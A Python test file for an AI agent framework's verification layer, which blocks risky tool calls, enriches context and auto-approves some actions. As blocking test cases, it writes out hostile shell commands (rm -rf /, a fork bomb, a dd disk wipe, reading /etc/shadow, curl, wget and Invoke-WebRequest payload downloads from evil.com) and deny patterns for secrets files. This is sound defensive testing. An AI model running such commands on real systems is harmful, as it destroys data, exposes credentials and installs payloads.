"""Tests for Phase 31→32: Verification Layer (L0, L1, L3).

Covers:
- L0: Pre-cognitive context enrichment
- L1: Rigid rule interception (R01–R04 + R05/R07/R08/R09)
- L3: Post-reflection & knowledge extraction + anti-pattern auditing
- Config: VerificationConfig defaults and parsing
"""

import asyncio
import json
import pytest
from dataclasses import dataclass
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

from nanobot.config.schema import Config, VerificationConfig
from nanobot.agent.verification import (
    VerificationLayer,
    RuleResult,
    _check_rule_message_content,
    _check_rule_destructive_guard,
    _check_rule_duplicate_calls,
    _check_rule_outlook_recipient,
    _check_rule_exec_length,
    _check_rule_sensitive_path,
    _check_rule_tool_call_count,
)


# ── Helpers ────────────────────────────────────────────────────────────

@dataclass
class FakeToolCall:
    """Minimal tool call mimic for rule tests."""
    id: str = "tc_001"
    name: str = "test_tool"
    arguments: dict = None

    def __post_init__(self):
        if self.arguments is None:
            self.arguments = {}

class FakeTool:
    def __init__(self, tags, *, static_tags=None):
        self.tags = tags
        self._static_tags = static_tags if static_tags is not None else tags
    @property
    def static_tags(self):
        return self._static_tags
    def get_effective_tags(self, args, config_override=None):
        return self.tags

class FakeRegistry:
    def __init__(self):
        from nanobot.agent.capability import CapabilityTag
        from nanobot.agent.tools.shell import ExecTool
        self._tools = {
            # Use the REAL ExecTool so evaluate_dynamic_tags() can
            # detect DESTRUCTIVE patterns — mirrors production behavior.
            "exec": ExecTool(),
            "browser": FakeTool(CapabilityTag.INFO_RETRIEVAL),
            "message": FakeTool(CapabilityTag.SYS_COMMUNICATION),
            "write_file": FakeTool(CapabilityTag.DATA_WRITE | CapabilityTag.MUTATIVE),
            "outlook": FakeTool(CapabilityTag.MUTATIVE)
        }
    def get(self, name):
        return self._tools.get(name)

_FAKE_REGISTRY = FakeRegistry()


def _make_verification(
    l0_enabled=True, l1_enabled=True, l3_enabled=True,
    l3_min_tools=3,
    knowledge_workflow=None, provider=None, model=None,
) -> VerificationLayer:
    """Create a VerificationLayer with specified config overrides."""
    cfg = VerificationConfig(
        l0_enabled=l0_enabled,
        l1_enabled=l1_enabled,
        l3_enabled=l3_enabled,
        l3_success_pattern_min_tools=l3_min_tools,
    )
    return VerificationLayer(
        config=cfg,
        provider=provider,
        model=model,
        knowledge_workflow=knowledge_workflow,
    )


# ═══════════════════════════════════════════════════════════════════════
# Config Tests
# ═══════════════════════════════════════════════════════════════════════

def test_verification_config_defaults():
    """Default values: L0/L1/L3 on."""
    cfg = VerificationConfig()
    assert cfg.l0_enabled is True
    assert cfg.l1_enabled is True
    assert cfg.l3_enabled is True
    assert cfg.l3_success_pattern_min_tools == 3


def test_verification_config_from_json():
    """JSON config values should be correctly parsed (L2 fields ignored gracefully)."""
    data = {
        "l0Enabled": True,
        "l1Enabled": False,
        "l2Enabled": True,      # old field — should be silently ignored
        "l2Model": "gpt-4o-mini",  # old field — should be silently ignored
        "l3Enabled": False,
        "l3SuccessPatternMinTools": 5,
    }
    cfg = VerificationConfig(**data)
    assert cfg.l0_enabled is True
    assert cfg.l1_enabled is False
    assert cfg.l3_enabled is False
    assert cfg.l3_success_pattern_min_tools == 5
    # l2 fields should NOT exist on the config object
    assert not hasattr(cfg, 'l2_enabled')


def test_verification_config_in_agents_config():
    """VerificationConfig should exist in the full Config hierarchy."""
    cfg = Config()
    assert hasattr(cfg.agents, "verification")
    assert isinstance(cfg.agents.verification, VerificationConfig)
    assert cfg.agents.verification.l0_enabled is True


# ═══════════════════════════════════════════════════════════════════════
# L0: Pre-cognitive Context Enrichment
# ═══════════════════════════════════════════════════════════════════════

def test_l0_enrich_context_injects_experience():
    """Experience hints should be injected into system prompt."""
    mock_kw = MagicMock()
    mock_kw.match_experience.return_value = "Use outlook tool for email tasks."

    mock_mem = MagicMock()
    mock_mem.experience_enabled = True
    mock_mem.reflection_enabled = False

    v = _make_verification(knowledge_workflow=mock_kw)
    msgs = [{"role": "system", "content": "Base prompt"}]

    injected = v.enrich_context(msgs, "send email", 0, memory_features=mock_mem)

    assert injected > 0
    assert "Helpful Experience" in msgs[0]["content"]
    assert "outlook" in msgs[0]["content"]


def test_l0_enrich_context_respects_budget():
    """Injection should not exceed _INJECTION_BUDGET."""
    mock_kw = MagicMock()
    # Return a huge experience that would bust the budget
    mock_kw.match_experience.return_value = "x" * 10000

    mock_mem = MagicMock()
    mock_mem.experience_enabled = True
    mock_mem.reflection_enabled = False

    v = _make_verification(knowledge_workflow=mock_kw)
    msgs = [{"role": "system", "content": "Base prompt"}]

    injected = v.enrich_context(msgs, "test", 0, memory_features=mock_mem)

    # Should not inject since the hint exceeds budget
    assert injected == 0
    assert "Helpful Experience" not in msgs[0]["content"]


def test_l0_enrich_context_disabled():
    """When l0_enabled=False, no injection should occur."""
    mock_kw = MagicMock()
    mock_kw.match_experience.return_value = "hint"
    v = _make_verification(l0_enabled=False, knowledge_workflow=mock_kw)
    msgs = [{"role": "system", "content": "Base prompt"}]

    injected = v.enrich_context(msgs, "test", 0)

    assert injected == 0
    assert msgs[0]["content"] == "Base prompt"


def test_l0_system_reminder_injected_on_long_session():
    """System reminder should be injected when session message count >= 15."""
    mock_mem = MagicMock()
    mock_mem.experience_enabled = False
    mock_mem.reflection_enabled = False

    v = _make_verification()
    msgs = [{"role": "system", "content": "Base prompt"}]

    injected = v.enrich_context(msgs, "test", 20, memory_features=mock_mem)

    assert injected > 0
    assert "System Reminder" in msgs[0]["content"]


def test_l0_no_system_reminder_for_short_session():
    """No system reminder for sessions with < 15 messages."""
    mock_mem = MagicMock()
    mock_mem.experience_enabled = False
    mock_mem.reflection_enabled = False

    v = _make_verification()
    msgs = [{"role": "system", "content": "Base prompt"}]

    injected = v.enrich_context(msgs, "test", 5, memory_features=mock_mem)

    assert injected == 0


# ═══════════════════════════════════════════════════════════════════════
# L1: Rigid Rule Interception
# ═══════════════════════════════════════════════════════════════════════

def test_l1_check_rules_passes_valid_call():
    """Valid tool calls should pass all rules."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "echo hello"})
    result = v.check_rules([tc])
    assert result.passed is True
    assert len(result.violations) == 0


def test_l1_check_rules_blocks_empty_message_content():
    """R01: message tool with empty content should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="message", arguments={"content": "", "chat_id": "123"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R01" in v for v in result.violations)


def test_l1_check_rules_blocks_destructive_exec():
    """R02: Destructive shell commands should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "rm -rf / --no-preserve-root"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)


def test_l1_check_rules_allows_safe_rm():
    """R02: Safe rm commands should NOT be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "rm -rf /tmp/test_dir"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    # Should pass — /tmp/test_dir is not root
    assert result.passed is True


def test_l1_check_rules_blocks_fork_bomb():
    """R02: Fork bomb should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": ":(){ :|:& }"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)


def test_l1_check_rules_detects_duplicate_calls():
    """R03: 3+ identical tool calls in same turn should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "echo x"})
    result = v.check_rules([tc, tc, tc])
    assert result.passed is False
    assert any("R03" in v for v in result.violations)


def test_l1_check_rules_allows_two_identical_calls():
    """R03: 2 identical calls should NOT trigger the rule (threshold is 3)."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "echo x"})
    result = v.check_rules([tc, tc])
    assert result.passed is True


def test_l1_check_rules_blocks_empty_outlook_recipient():
    """R04: outlook send_email without recipient should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="outlook", arguments={
        "action": "send_email", "to": "", "subject": "Test", "body": "Hi"
    })
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R04" in v for v in result.violations)


def test_l1_check_rules_disabled():
    """When l1_enabled=False, all calls should pass."""
    v = _make_verification(l1_enabled=False)
    tc = FakeToolCall(name="message", arguments={"content": ""})
    result = v.check_rules([tc])
    assert result.passed is True


def test_l1_rewrite_hint_present_on_violation():
    """Violation result should include a rewrite hint."""
    v = _make_verification()
    tc = FakeToolCall(name="message", arguments={"content": ""})
    result = v.check_rules([tc])
    assert result.rewrite_hint is not None
    assert "correct your approach" in result.rewrite_hint


# ═══════════════════════════════════════════════════════════════════════
# L1: New Rules R05/R07/R08/R09 (Phase 32)
# ═══════════════════════════════════════════════════════════════════════

def test_l1_r05_blocks_long_exec_command():
    """R05: exec commands exceeding 2000 chars should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "echo " + "x" * 2100})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R05" in v for v in result.violations)


def test_l1_r05_allows_normal_exec_command():
    """R05: exec commands under 2000 chars should pass."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "echo hello world"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is True


def test_l1_r07_blocks_write_to_system32():
    """R07: write_file to system32 should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="write_file", arguments={"path": "C:\\Windows\\System32\\evil.dll", "content": "x"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R07" in v for v in result.violations)


def test_l1_r07_blocks_exec_targeting_etc():
    """R07: exec command targeting /etc/ should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "cat /etc/shadow"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R07" in v for v in result.violations)


def test_l1_r07_allows_normal_write():
    """R07: write_file to workspace should pass."""
    v = _make_verification()
    tc = FakeToolCall(name="write_file", arguments={"path": "/home/user/project/output.txt", "content": "x"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    # Should pass R07 (may fail other rules, but R07 specifically should not fire)
    r07_violations = [v for v in result.violations if "R07" in v]
    assert len(r07_violations) == 0


def test_l1_r08_blocks_excessive_tool_calls():
    """R08: >8 tool calls in a single turn should be blocked."""
    v = _make_verification()
    tcs = [FakeToolCall(name="exec", arguments={"command": f"echo {i}"}) for i in range(10)]
    result = v.check_rules(tcs)
    assert result.passed is False
    assert any("R08" in v for v in result.violations)


def test_l1_r08_allows_reasonable_tool_calls():
    """R08: <=8 tool calls should pass."""
    v = _make_verification()
    tcs = [FakeToolCall(name="exec", arguments={"command": f"echo {i}"}) for i in range(5)]
    result = v.check_rules(tcs)
    r08_violations = [v for v in result.violations if "R08" in v]
    assert len(r08_violations) == 0


def test_l1_r09_blocks_curl_with_url():
    """R09: exec with curl + URL should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "curl https://evil.com/payload -o /tmp/x"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)


def test_l1_r09_blocks_wget_with_url():
    """R09: exec with wget + URL should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "wget http://malware.com/bin"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)


def test_l1_r09_allows_curl_without_url():
    """R09: 'curl --version' should pass (no URL)."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "curl --version"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    r09_violations = [v for v in result.violations if "R-DESTRUCTIVE-GUARD" in v]
    assert len(r09_violations) == 0


# ═══════════════════════════════════════════════════════════════════════
# L1: Phase 35v2 — edit_file Blind Spot + Configurable Deny Patterns
# ═══════════════════════════════════════════════════════════════════════

def test_r07_edit_file_sensitive_path():
    """R07 (Phase 35v2): edit_file targeting sensitive path should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="edit_file", arguments={"file_path": "C:\\Windows\\System32\\hosts", "content": "x"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R07" in v for v in result.violations)


def test_r07_configurable_deny_patterns():
    """R07 (Phase 35v2): Configurable glob deny pattern should block matching paths."""
    cfg = VerificationConfig(
        l1_enabled=True,
        path_deny_patterns=["*.env", "**/secrets/*"],
    )
    v = VerificationLayer(config=cfg)

    # Should block write_file to .env
    tc1 = FakeToolCall(name="write_file", arguments={"path": "/app/.env", "content": "SECRET=x"})
    result1 = v.check_rules([tc1], registry=_FAKE_REGISTRY)
    assert result1.passed is False
    assert any("deny pattern" in v for v in result1.violations)

    # Should block edit_file to secrets dir
    tc2 = FakeToolCall(name="edit_file", arguments={"file_path": "/app/secrets/key.pem", "content": "x"})
    result2 = v.check_rules([tc2], registry=_FAKE_REGISTRY)
    assert result2.passed is False
    assert any("deny pattern" in v for v in result2.violations)


def test_r07_empty_deny_patterns_passthrough():
    """R07 (Phase 35v2): Empty deny list should not affect normal operations."""
    cfg = VerificationConfig(
        l1_enabled=True,
        path_deny_patterns=[],
    )
    v = VerificationLayer(config=cfg)
    tc = FakeToolCall(name="write_file", arguments={"path": "/home/user/project/readme.md", "content": "hi"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    r07_violations = [v for v in result.violations if "R07" in v]
    assert len(r07_violations) == 0


def test_r07_malformed_pattern_fail_open():
    """R07 (Phase 35v2): Malformed deny patterns should fail-open (no false rejects)."""
    cfg = VerificationConfig(
        l1_enabled=True,
        path_deny_patterns=["", "   ", "[invalid"],  # Bad patterns
    )
    v = VerificationLayer(config=cfg)
    tc = FakeToolCall(name="write_file", arguments={"path": "/home/user/project/app.py", "content": "x"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    r07_violations = [v for v in result.violations if "R07" in v]
    assert len(r07_violations) == 0

# ── L2 Codex Regression: exact-path / UNC / root deny patterns ────────
# These tests pin the A1 fix (resolved_prefix vs resolved_norm split).
# If someone reverts to using the trailing-sep path for fnmatch, these
# will catch the regression.

def test_r07_deny_exact_fullpath():
    """R07 (L2-A1): Exact fullpath deny pattern should block the matching file.

    This failed before the resolved_prefix/resolved_norm split because
    the trailing os.sep on resolved_check broke fnmatch matching for
    patterns like 'c:\\app\\.env' (the actual path became 'c:\\app\\.env\\').
    """
    import os
    # Build a platform-appropriate exact deny pattern
    target_path = os.path.normpath(os.path.realpath("/app/.env")).lower()
    cfg = VerificationConfig(
        l1_enabled=True,
        path_deny_patterns=[target_path],
    )
    v = VerificationLayer(config=cfg)

    tc = FakeToolCall(name="write_file", arguments={"path": "/app/.env", "content": "SECRET=x"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False, (
        f"Exact fullpath deny '{target_path}' should have blocked, "
        f"but got violations={result.violations}"
    )
    assert any("deny pattern" in v for v in result.violations)


def test_r07_deny_forward_slash_path():
    """R07 (L2-A1): Forward-slash path should be normalized and matched."""
    import os
    # Use forward slashes — normpath should handle them
    target_path = os.path.normpath(os.path.realpath("/app/config.yaml")).lower()
    cfg = VerificationConfig(
        l1_enabled=True,
        path_deny_patterns=[target_path],
    )
    v = VerificationLayer(config=cfg)

    tc = FakeToolCall(name="write_file", arguments={"path": "/app/config.yaml", "content": "x"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False, (
        f"Forward-slash deny '{target_path}' should have blocked"
    )


def test_r07_deny_basename_catches_any_directory():
    """R07 (L2-A1): Basename-level pattern '*.pem' should block .pem in any directory."""
    cfg = VerificationConfig(
        l1_enabled=True,
        path_deny_patterns=["*.pem"],
    )
    v = VerificationLayer(config=cfg)

    # Regular path
    tc1 = FakeToolCall(name="write_file", arguments={"path": "/app/certs/secret.pem", "content": "x"})
    result1 = v.check_rules([tc1], registry=_FAKE_REGISTRY)
    assert result1.passed is False

    # Deep nested path
    tc2 = FakeToolCall(name="edit_file", arguments={"file_path": "/a/b/c/d/key.pem", "content": "x"})
    result2 = v.check_rules([tc2], registry=_FAKE_REGISTRY)
    assert result2.passed is False

    # Non-pem should pass
    tc3 = FakeToolCall(name="write_file", arguments={"path": "/app/readme.md", "content": "x"})
    result3 = v.check_rules([tc3], registry=_FAKE_REGISTRY)
    r07_pem = [v for v in result3.violations if "deny pattern" in v]
    assert len(r07_pem) == 0


# ═══════════════════════════════════════════════════════════════════════
# L3: Post-reflection & Knowledge Extraction
# ═══════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_l3_post_reflect_extracts_success_pattern():
    """L3 should extract a success pattern when workflow uses 3+ tools."""
    mock_response = MagicMock()
    mock_response.content = json.dumps({
        "trigger": "Send sales report",
        "prompt": "Use outlook.read_email → attachment_analyzer → message"
    })
    mock_provider = MagicMock()
    mock_provider.chat = AsyncMock(return_value=mock_response)

    mock_store = MagicMock()
    mock_kw = MagicMock()
    mock_kw.knowledge_store = mock_store

    v = _make_verification(
        l3_enabled=True, l3_min_tools=3,
        knowledge_workflow=mock_kw, provider=mock_provider, model="test-model"
    )

    await v.post_reflect(
        request_text="Send the daily sales report to the team",
        final_content="Email sent successfully with the report attached.",
        tools_used=["outlook", "attachment_analyzer", "message"],
        tool_calls_with_args=[
            {"tool": "outlook", "args": {}},
            {"tool": "attachment_analyzer", "args": {}},
            {"tool": "message", "args": {}},
        ],
        session=MagicMock(),
        exit_kind="success",
    )

    # Verify add_experience was called with a success pattern
    mock_store.add_experience.assert_called_once()
    call_args = mock_store.add_experience.call_args
    assert "SUCCESS PATTERN" in call_args.kwargs.get("tactical_prompt", "") or \
           "SUCCESS PATTERN" in call_args[1].get("tactical_prompt", call_args[0][1] if len(call_args[0]) > 1 else "")


@pytest.mark.asyncio
async def test_l3_post_reflect_processes_short_workflows_p39():
    """L3 should process short workflows (Phase 39) for high-entropy conversation."""
    mock_response = MagicMock()
    mock_response.content = "{}"
    mock_provider = MagicMock()
    mock_provider.chat = AsyncMock(return_value=mock_response)

    mock_kw = MagicMock()
    mock_kw.knowledge_store = MagicMock()

    v = _make_verification(
        l3_enabled=True, l3_min_tools=3,
        knowledge_workflow=mock_kw, provider=mock_provider, model="test-model"
    )

    await v.post_reflect(
        request_text="hello",
        final_content="Hi there!",
        tools_used=["message"],
        tool_calls_with_args=[{"tool": "message", "args": {}}],
        session=MagicMock(),
        exit_kind="success",
    )

    # Should call LLM now in Phase 39
    mock_provider.chat.assert_called_once()


@pytest.mark.asyncio
async def test_l3_post_reflect_disabled():
    """L3 should skip entirely when disabled."""
    mock_provider = MagicMock()
    v = _make_verification(l3_enabled=False, provider=mock_provider)

    await v.post_reflect(
        request_text="test",
        final_content="done",
        tools_used=["a", "b", "c"],
        tool_calls_with_args=[{"tool": "a", "args": {}}] * 3,
        session=MagicMock(),
        exit_kind="success",
    )

    mock_provider.chat.assert_not_called()


@pytest.mark.asyncio
async def test_l3_post_reflect_handles_error():
    """L3 should not crash when LLM call fails."""
    mock_provider = MagicMock()
    mock_provider.chat = AsyncMock(side_effect=RuntimeError("API error"))

    mock_kw = MagicMock()
    mock_kw.knowledge_store = MagicMock()

    v = _make_verification(
        l3_enabled=True, l3_min_tools=2,
        knowledge_workflow=mock_kw, provider=mock_provider, model="test-model"
    )

    # Should not raise
    await v.post_reflect(
        request_text="test task",
        final_content="completed successfully",
        tools_used=["a", "b", "c"],
        tool_calls_with_args=[{"tool": "a", "args": {}}] * 3,
        session=MagicMock(),
        exit_kind="success",
    )


@pytest.mark.asyncio
async def test_l3_skips_failed_workflows():
    """L3 should not extract success patterns from failed workflows."""
    mock_provider = MagicMock()
    mock_kw = MagicMock()
    mock_kw.knowledge_store = MagicMock()

    v = _make_verification(
        l3_enabled=True, l3_min_tools=2,
        knowledge_workflow=mock_kw, provider=mock_provider, model="test-model"
    )

    # final_content contains a fail indicator
    # Phase 64: ExitKind refactoring — post_reflect now uses explicit exit_kind
    # parameter instead of scanning final_content text for failure indicators.
    await v.post_reflect(
        request_text="send email",
        final_content="很抱歉，无法完成此任务",
        tools_used=["outlook", "message", "exec"],
        tool_calls_with_args=[{"tool": "outlook", "args": {}}] * 3,
        session=MagicMock(),
        exit_kind="failure",
    )

    # Should NOT call LLM since workflow failed
    mock_provider.chat.assert_not_called()


# ═══════════════════════════════════════════════════════════════════════
# Individual Rule Function Tests (unit-level)
# ═══════════════════════════════════════════════════════════════════════

def test_rule_message_content_valid():
    """R01: message with content should pass."""
    tc = FakeToolCall(name="message", arguments={"content": "Hello!"})
    assert _check_rule_message_content([tc]) == []


def test_rule_message_content_empty():
    """R01: message with empty content should fail."""
    tc = FakeToolCall(name="message", arguments={"content": "  "})
    violations = _check_rule_message_content([tc])
    assert len(violations) == 1
    assert "R01" in violations[0]


def test_rule_destructive_exec_safe():
    """R02: Safe exec should pass."""
    tc = FakeToolCall(name="exec", arguments={"command": "ls -la"})
    assert _check_rule_destructive_guard([tc], registry=_FAKE_REGISTRY) == []


def test_rule_destructive_exec_rm_rf():
    """R02: rm -rf / should fail."""
    tc = FakeToolCall(name="exec", arguments={"command": "rm -rf /"})
    violations = _check_rule_destructive_guard([tc], registry=_FAKE_REGISTRY)
    assert len(violations) == 1
    assert "R-DESTRUCTIVE-GUARD" in violations[0]


def test_rule_destructive_exec_dd():
    """R02: dd of=/dev/sda should fail."""
    tc = FakeToolCall(name="exec", arguments={"command": "dd if=/dev/zero of=/dev/sda"})
    violations = _check_rule_destructive_guard([tc], registry=_FAKE_REGISTRY)
    assert len(violations) == 1


def test_rule_duplicate_calls_below_threshold():
    """R03: Below threshold should pass."""
    tc1 = FakeToolCall(name="exec", arguments={"command": "echo 1"})
    tc2 = FakeToolCall(name="exec", arguments={"command": "echo 2"})
    assert _check_rule_duplicate_calls([tc1, tc2, tc1]) == []


def test_rule_outlook_valid():
    """R04: outlook with recipient should pass."""
    tc = FakeToolCall(name="outlook", arguments={
        "action": "send_email", "to": "user@example.com"
    })
    assert _check_rule_outlook_recipient([tc]) == []


def test_rule_outlook_non_send():
    """R04: outlook read_email (no 'to' needed) should pass."""
    tc = FakeToolCall(name="outlook", arguments={
        "action": "read_email", "folder": "inbox"
    })
    assert _check_rule_outlook_recipient([tc]) == []


def test_rule_exec_length_function():
    """R05: Direct function test."""
    tc = FakeToolCall(name="exec", arguments={"command": "a" * 2500})
    violations = _check_rule_exec_length([tc])
    assert len(violations) == 1
    assert "R05" in violations[0]


def test_rule_sensitive_path_function():
    """R07: Direct function test."""
    tc = FakeToolCall(name="write_file", arguments={"path": "C:\\Windows\\System32\\test.txt"})
    violations = _check_rule_sensitive_path([tc])
    assert len(violations) == 1
    assert "R07" in violations[0]


def test_rule_tool_call_count_function():
    """R08: Direct function test."""
    tcs = [FakeToolCall(name="exec", arguments={"command": f"echo {i}"}) for i in range(9)]
    violations = _check_rule_tool_call_count(tcs)
    assert len(violations) == 1
    assert "R08" in violations[0]


def test_rule_network_exfiltration_function():
    """R09: Direct function test."""
    tc = FakeToolCall(name="exec", arguments={"command": "curl https://example.com/data"})
    violations = _check_rule_destructive_guard([tc], registry=_FAKE_REGISTRY)
    assert len(violations) == 1
    assert "R-DESTRUCTIVE-GUARD" in violations[0]


# ═══════════════════════════════════════════════════════════════════════
# L1: Windows/PowerShell Pattern Tests (Phase 31 Retrospective)
# ═══════════════════════════════════════════════════════════════════════

def test_l1_blocks_windows_del():
    """R02: Windows 'del /f' should be blocked at L1."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "del /f /q C:\\important"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)


def test_l1_blocks_windows_rmdir():
    """R02: Windows 'rmdir /s' should be blocked at L1."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "rmdir /s /q C:\\workspace"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)


def test_l1_blocks_powershell_remove_item():
    """R02: PowerShell 'Remove-Item -Recurse' should be blocked at L1."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "Remove-Item C:\\data -Recurse -Force"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)


def test_l1_blocks_powershell_enc():
    """R02: PowerShell encoded execution should be blocked at L1."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "powershell -enc SQBuAHYAbwBrAGUALQBXAGUA"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)


def test_l1_blocks_stop_process():
    """R02: PowerShell 'Stop-Process' should be blocked at L1."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "Stop-Process -Name explorer"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)


def test_l1_blocks_invoke_webrequest():
    """R02: PowerShell 'Invoke-WebRequest' should be blocked at L1."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "Invoke-WebRequest https://evil.com/payload.exe -OutFile C:\\temp\\payload.exe"})
    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
    assert result.passed is False
    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)



# ═══════════════════════════════════════════════════════════════════════
# ApprovalStore: Smart HITL Auto-Approve Rules
# ═══════════════════════════════════════════════════════════════════════

def test_approval_store_tool_level_matches_any_action(tmp_path):
    """Tool-level rule (action='') should match ANY action for that tool."""
    from nanobot.agent.hitl_store import ApprovalStore
    store = ApprovalStore(tmp_path)
    store.add_approval("browser", "")  # Tool-level wildcard

    assert store.is_approved("browser", {"action": "click", "selector": "text=\"Submit\""})
    assert store.is_approved("browser", {"action": "fill", "selector": "input#name", "value": "test"})
    assert store.is_approved("browser", {"action": "navigate", "url": "https://example.com"})
    assert store.is_approved("browser", {"action": "type", "selector": "textarea", "text": "hello"})


def test_approval_store_action_specific_only_matches_that_action(tmp_path):
    """Action-specific rule should NOT match other actions."""
    from nanobot.agent.hitl_store import ApprovalStore
    store = ApprovalStore(tmp_path)
    store.add_approval("browser", "click")

    assert store.is_approved("browser", {"action": "click", "selector": "text=\"OK\""})
    assert not store.is_approved("browser", {"action": "fill", "selector": "input", "value": "x"})


def test_approval_store_dedup_prevents_duplicates(tmp_path):
    """Adding the same rule twice should not create a duplicate."""
    from nanobot.agent.hitl_store import ApprovalStore
    store = ApprovalStore(tmp_path)
    store.add_approval("browser", "")
    store.add_approval("browser", "")  # Should be skipped
    store.add_approval("browser", "click")  # Should also be skipped (broader rule exists)

    assert len(store._rules) == 1


def test_approval_store_tool_level_subsumes_action_specific(tmp_path):
    """Adding a tool-level rule after action-specific ones: subsequent action calls should match."""
    from nanobot.agent.hitl_store import ApprovalStore
    store = ApprovalStore(tmp_path)
    store.add_approval("browser", "click")  # Action-specific first
    store.add_approval("browser", "")       # Then tool-level

    # Even "fill" should now match via the tool-level rule
    assert store.is_approved("browser", {"action": "fill", "selector": "input", "value": "x"})
    assert store.is_approved("browser", {"action": "click", "selector": "button"})


def test_approval_store_cross_tool_isolation(tmp_path):
    """Approving one tool should NOT approve a different tool."""
    from nanobot.agent.hitl_store import ApprovalStore
    store = ApprovalStore(tmp_path)
    store.add_approval("browser", "")

    assert store.is_approved("browser", {"action": "click"})
    assert not store.is_approved("exec", {"command": "rm -rf /"})
    assert not store.is_approved("outlook", {"action": "send_email"})

